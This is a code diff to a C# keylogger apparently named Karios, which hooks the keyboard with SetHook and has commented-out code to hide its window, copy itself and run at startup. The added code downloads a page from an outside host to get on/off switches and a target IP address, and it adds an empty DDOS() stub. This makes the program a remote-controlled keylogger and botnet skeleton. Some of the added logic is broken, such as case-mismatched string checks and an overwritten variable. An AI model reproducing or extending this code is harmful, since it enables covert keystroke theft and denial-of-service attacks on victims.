@@ -24,6 +24,7 @@ namespace Karios
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static string LocalIP;
+        private static string GlobalTargetIP;
         public static void Main()
         {
             var handle = GetConsoleWindow();
@@ -35,19 +36,29 @@ namespace Karios
                 try
                 {
                     string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
-                    if (!webData.ToUpperInvariant().Contains("online"))
+                    if (!webData.ToUpperInvariant().Contains("Keyonline"))
+                    
 
-
-                        // Hide the window
-                        //ShowWindow(handle, SW_HIDE);
-                        // Persitance feature
-                        //Duplicate();
-                        // Run on startup
-                        //SetStartup();
-                        // Start Applicatiom
-                        _hookID = SetHook(_proc);
-                    Application.Run();
+                    // Hide the window
+                    //ShowWindow(handle, SW_HIDE);
+                    // Persitance feature
+                    //Duplicate(); 
+                    // Run on startup 
+                    //SetStartup();
+                    // Start Application
+                    _hookID = SetHook(_proc);
+                    Application.Run();  
                     UnhookWindowsHookEx(_hookID);
+                    if (!webData.ToUpperInvariant().Contains("ip:"))
+                    {
+                        string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopas";
+                        string IPTarget = webData.Substring(webData.IndexOf(search) + search.Length);
+                        IPTarget = IPTarget.Replace(@"</p>", "");
+                        // IPTarget = IP on cutenesss.xyz/SteamerTest.html
+                        IPTarget = GlobalTargetIP;
+                    }
+
+
                 }
                 catch { }
             }
@@ -182,6 +193,21 @@ namespace Karios
                 {
                     //do something
                 }
+            }
+        }
+        public static void DDOS()
+        {
+            using (WebClient wc = new WebClient())
+            {
+                try
+                {
+                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
+                    if (!webData.ToUpperInvariant().Contains("DDOSonline")) 
+                    {
+                        // DDOS Stuff here
+                    }
+                }
+                catch { }
             }
         }
 
